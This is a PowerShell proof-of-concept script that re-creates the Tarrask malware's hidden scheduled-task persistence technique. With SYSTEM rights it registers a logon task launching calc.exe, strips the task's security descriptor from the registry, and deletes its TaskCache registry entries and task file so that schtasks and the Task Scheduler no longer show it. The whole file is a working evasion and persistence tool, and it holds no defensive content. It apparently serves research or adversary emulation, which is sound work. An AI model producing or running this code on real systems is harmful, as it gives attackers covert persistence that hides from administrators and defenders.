# Tarrask Malware - Hidden Scheduled Task Persistence Technique
# Note: Requires SYSTEM privileges
# Author: https://twitter.com/knight0x07
# Reference: https://www.microsoft.com/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/

$create_task = cmd /c "schtasks /create /tn HideItForever /tr "C:\Windows\System32\calc.exe" /sc onlogon /ru knight"
if( $? ) {
	Write-Output "	[+] Scheduling HideItForever Task!"
	Write-Output "	[+] Querying Task Scheduler ( Can also be verified from the Task Scheduler GUI)"
	$query_task = cmd /c "schtasks /query /fo LIST /tn HideItForever"
	if( $? ) {
		Write-Output "	[+] HideItForever Task is been scheduled successfully!"
		$query_task
		Write-Output "	[+] Hiding the HideItForever Task!"
		$hide = Get-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\HideItForever' | Remove-ItemProperty -Name SD
		if ( $? ){
				Write-Output "	[+] HideItForever Task Hidden!"
				Write-Output "	[+] Removing all on-disk Artifacts!"
				$Id_value = Get-ItemPropertyValue 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\HideItForever' 'Id'
				$regfinal = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\' + $Id_value
				Remove-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\HideItForever' -Force
				Remove-Item -Path $regfinal -Force
				Remove-Item -Path 'C:\Windows\System32\Tasks\HideItForever'  -Force
				Write-Output "	[+] The Scheduled Task is now Completely Hidden :) - Go check it out manually!"
				Write-Output "	[+] Querying it using Schtasks!"
				cmd /c "schtasks /query /fo LIST /tn HideItForever"

		}
	}
}
else
{
	Write-Output "	[+] Exiting!"
}